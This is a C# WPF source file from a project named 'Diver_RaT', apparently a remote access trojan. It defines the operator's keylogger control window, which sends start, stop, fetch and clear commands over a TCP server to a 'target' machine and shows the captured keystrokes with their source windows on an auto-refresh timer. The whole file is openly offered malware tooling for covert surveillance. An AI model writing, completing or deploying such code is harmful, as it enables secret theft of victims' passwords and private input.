using System;
using System.ComponentModel;
using System.Windows;
using System.Windows.Threading;

namespace Diver_RaT
{
    public partial class KeyloggerWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private readonly DispatcherTimer _autoTimer;
        private bool _fetching;
        private bool _running;

        public KeyloggerWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"Keylogger - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";

            _autoTimer = new DispatcherTimer();
            _autoTimer.Tick += async (_, _) => await FetchLogAsync();
            RestartAutoTimer();
        }

        private void StartButton_Click(object sender, RoutedEventArgs e) => _ = SetState(true);

        private void StopButton_Click(object sender, RoutedEventArgs e) => _ = SetState(false);

        private void GetButton_Click(object sender, RoutedEventArgs e) => _ = FetchLogAsync();

        private async void ClearButton_Click(object sender, RoutedEventArgs e)
        {
            ClearButton.IsEnabled = false;
            var result = await _server.SendCommandAsync(_device.Id, "CLEAR_KEYLOG");
            if (result.Success)
            {
                LogBox.Text = "";
                CharCountText.Text = "0 chars";
                StatusText.Text = "Keylog cleared on target.";
            }
            else
            {
                StatusText.Text = $"Failed: {result.Error}";
            }
            ClearButton.IsEnabled = true;
        }

        private void AutoRefresh_Changed(object sender, RoutedEventArgs e)
        {
            RestartAutoTimer();
            _ = FetchLogAsync();
        }

        private void IntervalBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
        {
            RestartAutoTimer();
        }

        private void RestartAutoTimer()
        {
            if (_autoTimer is null || IntervalBox is null || AutoRefreshCheck is null) return;
            var secs = ParseInterval();
            _autoTimer.Stop();
            if (AutoRefreshCheck.IsChecked == true && secs > 0)
            {
                _autoTimer.Interval = TimeSpan.FromSeconds(secs);
                _autoTimer.Start();
                StatusText.Text = $"Auto-refresh every {secs}s - fetching keystroke log.";
            }
            else
            {
                StatusText.Text = "Auto-refresh paused. Press 'Get Log Now' to fetch manually.";
            }
        }

        private int ParseInterval()
        {
            return int.TryParse(IntervalBox.Text.Trim(), out var secs) && secs >= 2 ? secs : 0;
        }

        private async System.Threading.Tasks.Task FetchLogAsync()
        {
            if (_fetching || LogBox is null) return;
            _fetching = true;
            try
            {
                var result = await _server.SendCommandAsync(_device.Id, "GET_KEYLOG", timeoutMs: 15000);
                if (result.Success)
                {
                    var text = string.IsNullOrEmpty(result.Result) ? "" : result.Result;
                    LogBox.Text = string.IsNullOrWhiteSpace(text)
                        ? "(no keys captured yet - press Start to begin logging on the target)"
                        : text;
                    LogBox.ScrollToEnd();
                    CharCountText.Text = $"{(text.Length == 0 ? 0 : text.Length):N0} chars";
                    var next = _autoTimer.IsEnabled ? $" | next refresh in ~{_autoTimer.Interval.TotalSeconds:0}s" : "";
                    StatusText.Text = $"Log fetched at {DateTime.Now:HH:mm:ss}{next}";
                }
                else
                {
                    StatusText.Text = $"Failed: {result.Error}";
                }
            }
            finally
            {
                _fetching = false;
            }
        }

        private async System.Threading.Tasks.Task SetState(bool start)
        {
            StartButton.IsEnabled = false;
            StopButton.IsEnabled = false;
            StatusText.Text = start ? "Starting keylogger on target..." : "Stopping keylogger...";

            var result = await _server.SendCommandAsync(_device.Id, start ? "START_KEYLOG" : "STOP_KEYLOG");
            StartButton.IsEnabled = !start;
            StopButton.IsEnabled = start;
            if (result.Success)
            {
                _running = start;
                StateText.Text = start ? "Running" : "Stopped";
                StateText.Foreground = start
                    ? System.Windows.Media.Brushes.LightGreen
                    : System.Windows.Media.Brushes.LightGray;
                StateDot.Fill = start
                    ? System.Windows.Media.Brushes.LightGreen
                    : System.Windows.Media.Brushes.DimGray;
                StatusText.Text = start
                    ? "Keylogger running on target. Captured input is attributed to its source window."
                    : "Keylogger stopped on target.";
                if (start) await FetchLogAsync();
            }
            else
            {
                StatusText.Text = $"Failed: {result.Error}";
            }
        }

        private void Window_Closing(object? sender, CancelEventArgs e)
        {
            _autoTimer.Stop();
        }
    }
}
